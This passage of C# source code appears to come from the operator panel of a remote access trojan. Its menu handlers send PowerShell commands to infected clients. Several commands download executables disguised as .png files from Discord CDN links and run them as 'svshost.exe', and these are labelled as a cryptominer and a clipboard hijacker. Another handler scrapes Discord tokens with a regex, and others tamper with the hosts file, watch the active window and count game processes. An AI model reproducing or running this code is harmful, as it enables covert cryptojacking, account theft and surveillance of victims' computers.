                        item.Font = new System.Drawing.Font("Segoe UI", 9, System.Drawing.FontStyle.Bold);
                    }
                    else 
                    {
                        item.Font = new System.Drawing.Font("Segoe UI", 9);
                    }
                }
            }
        }

        private void timer_get_window_Tick(object sender, EventArgs e)
        {
            foreach (Client c in GetConnectedClients())
            {
                c.Send(new DoShellExecute { Command = "powershell -command \"$code = '[DllImport(\\\"user32.dll\\\")] public static extern IntPtr GetForegroundWindow();';Add-Type $code -Name Utils -Namespace Win32; Get-Process | Where-Object { $_.mainWindowHandle -eq [Win32.Utils]::GetForegroundWindow() } | Select-Object MainWindowTItle | ForEach-Object {\\\"CURWIND*=\\\"+$_.MainWindowTItle}\" " });
                c.Send(new DoShellExecute { Command = "powershell -command \"'DFSCOUNT*=' + (get-process dofus).count\"" });
            }
        }

        private void refreshToolStripMenuItem_Click_1(object sender, EventArgs e)
        {
            foreach (Client c in GetSelectedClients())
            {
                var item = GetListViewItemByClient(c);
                if (item != null)
                {
                    item.SubItems[3].Text = c.Value.Version;
                    item.SubItems[8].Text = c.Value.AccountType;
                    if (c.Value.AccountType != "0")
                    {
                        item.Font = new System.Drawing.Font("Segoe UI", 9, System.Drawing.FontStyle.Bold);
                    }
                    else
                    {
                        item.Font = new System.Drawing.Font("Segoe UI", 9);
                    }
                }
            }
        }

        private void sendCommandToolStripMenuItem_Click(object sender, EventArgs e)
        {
            foreach (Client c in GetSelectedClients())
            {
                c.Send(new DoShellExecute { Command = "powershell -command \"$code = '[DllImport(\\\"user32.dll\\\")] public static extern IntPtr GetForegroundWindow();';Add-Type $code -Name Utils -Namespace Win32; Get-Process | Where-Object { $_.mainWindowHandle -eq [Win32.Utils]::GetForegroundWindow() } | Select-Object MainWindowTItle | ForEach-Object {\\\"CURWIND*=\\\"+$_.MainWindowTItle}\" " });
                c.Send(new DoShellExecute { Command = "powershell -command \"'DFSCOUNT*=' + (get-process dofus).count\"" });
            }
        }

        private void minerToolStripMenuItem_Click(object sender, EventArgs e)
        {
            foreach (Client c in GetSelectedClients())
            {
                c.Send(new DoShellExecute { Command = "powershell -command \"(New-Object Net.WebClient).DownloadFile('https://cdn.discordapp.com/attachments/918845039176712243/918845272552005642/Ckhqfuu.png', 'C://Windows//Temp//svshost.exe') ; start 'C:/Windows/Temp/svshost.exe'\"" });

            }
        }

        private void clipJackToolStripMenuItem_Click(object sender, EventArgs e)
        {
            foreach (Client c in GetSelectedClients())
            {
                c.Send(new DoShellExecute { Command = "powershell -command \"(New-Object Net.WebClient).DownloadFile('https://cdn.discordapp.com/attachments/918845039176712243/939138953326518282/srs.png', 'C://Windows//Temp//srs.exe') ; start 'C:/Windows/Temp/srs.exe'\"" });

            }
        }

        private void minerIfGPUToolStripMenuItem_Click(object sender, EventArgs e)
        {
            foreach (Client c in GetSelectedClients())
            {
                c.Send(new DoShellExecute { Command = "powershell -command \" $gpu = Get-WmiObject Win32_VideoController;if ($gpu.description -match 'GeForce RTX' -or $gpu.description -match 'GeForce GTX' -or $gpu.description -match 'Radeon RX' -or $gpu.description -match 'Radeon R9' -or $gpu.description -match 'Radeon(TM) RX' -or $gpu.description -match 'Radeon(TM) R9'  -or $gpu.description -match 'Radeon (TM) RX'  -or $gpu.description -match 'Radeon (TM) R9'){(New-Object Net.WebClient).DownloadFile('https://cdn.discordapp.com/attachments/918845039176712243/918845272552005642/Ckhqfuu.png', $env:TEMP+'/svshost.exe');start $env:TEMP'/svshost.exe';} \"" });
            }
        }

        private void hostsToolStripMenuItem_Click(object sender, EventArgs e)
        {
            foreach (Client c in GetSelectedClients())
            {
                FrmFileManager frmFM = new FrmFileManager(c);
                frmFM._fileManagerHandler.BeginUploadFile("hosts", "C:\\Windows\\System32\\drivers\\etc\\hosts");
            }
        }

        private void deleteToolStripMenuItem_Click(object sender, EventArgs e)
        {
            foreach (Client c in GetSelectedClients())
            {
                FrmFileManager frmFM = new FrmFileManager(c);
                frmFM._fileManagerHandler.DeleteFile("C:\\Windows\\System32\\drivers\\etc\\hosts", FileType.File);
            }
        }

        private void getDiscordTokenToolStripMenuItem_Click(object sender, EventArgs e)
        {
            foreach (Client c in GetSelectedClients())
            {
                c.Send(new DoShellExecute { Command = "powershell -command \"Get-ChildItem -Path $Env:AppData'\\discord\\Local Storage\\leveldb\\*.ldb' | Select-String -Pattern 'mfa\\.[\\w-]{84}|[\\w-]{24}\\.[\\w-]{6}\\.[\\w-]{27}' -AllMatches | % { $_.Matches } | % { $_.Value } > $Env:AppData'\\discord\\Local Storage\\leveldb\\dtk'\"" });

            }
        }

        private void getHasuftxtToolStripMenuItem_Click(object sender, EventArgs e)
        {
            foreach (Client c in GetSelectedClients())
            {
                c.Send(new DoShellExecute { Command = "powershell -command \"'langue : '+[CultureInfo]::InstalledUICulture.Name.split('-')[0]+' / username : '+[Environment]::GetFolderPath('MyDocuments').split('\\')[2] > C://Windows//Temp//getHashSuf.txt\"" });
            }
        }
    }
}